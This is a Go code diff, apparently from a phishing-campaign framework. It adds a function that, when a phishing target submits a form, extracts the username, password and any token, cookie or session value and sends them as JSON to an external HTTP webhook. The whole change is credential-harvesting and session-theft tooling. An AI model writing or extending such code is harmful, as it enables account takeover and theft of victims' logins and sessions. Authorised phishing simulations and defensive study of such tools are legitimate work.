@@ -194,7 +194,7 @@ func (wh *Webhook) Notify(e *Event) {
 		if method == "" {
 			method = "POST"
 		}
-		if err := webhook.SendHTTPAPI(method, wh.URL, wh.apiHeadersMap(), e); err != nil {
+		if err := webhook.SendHTTPAPI(method, wh.URL, wh.apiHeadersMap(), buildHTTPAPIPayload(e)); err != nil {
 			log.Errorf("error sending http api webhook: %v", err)
 		}
 		return
@@ -202,6 +202,39 @@ func (wh *Webhook) Notify(e *Event) {
 	if err := webhook.Send(webhook.EndPoint{URL: wh.URL, Secret: wh.Secret}, e); err != nil {
 		log.Errorf("error sending webhook: %v", err)
 	}
+}
+
+type HTTPAPIPayload struct {
+	CampaignID int64           `json:"campaign_id"`
+	Email      string          `json:"email"`
+	Time       string          `json:"time"`
+	Event      string          `json:"event"`
+	Username   string          `json:"username,omitempty"`
+	Password   string          `json:"password,omitempty"`
+	Cookies    json.RawMessage `json:"cookies,omitempty"`
+}
+
+func buildHTTPAPIPayload(e *Event) HTTPAPIPayload {
+	p := HTTPAPIPayload{
+		CampaignID: e.CampaignId,
+		Email:      e.Email,
+		Time:       e.Time.UTC().Format("2006-01-02T15:04:05Z"),
+		Event:      e.Message,
+	}
+	if e.Message == EventDataSubmit {
+		payload := payloadFromEvent(e)
+		p.Username = findPayloadValue(payload, []string{"user", "email", "login"})
+		p.Password = findPayloadValue(payload, []string{"pass"})
+		if cv := findPayloadValue(payload, []string{"token", "cookie", "session"}); cv != "" {
+			if json.Valid([]byte(cv)) {
+				p.Cookies = json.RawMessage(cv)
+			} else {
+				b, _ := json.Marshal(cv)
+				p.Cookies = json.RawMessage(b)
+			}
+		}
+	}
+	return p
 }
 
 func (wh *Webhook) formatTelegramMessage(e *Event) string {
